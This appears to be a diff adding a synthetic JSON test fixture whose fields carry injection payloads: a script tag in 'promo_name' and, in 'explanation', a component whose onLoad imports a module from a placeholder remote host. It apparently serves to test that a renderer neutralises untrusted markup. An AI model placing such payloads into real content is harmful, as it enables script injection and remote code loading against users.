@@ -1,0 +1,5 @@
+{
+  "fixtureKind": "synthetic-preview",
+  "promo_name": "<script>globalThis.hostileFixtureExecuted=true</script>",
+  "explanation": "<Widget onLoad={() => import('https://invalid.example/module.js')} />"
+}
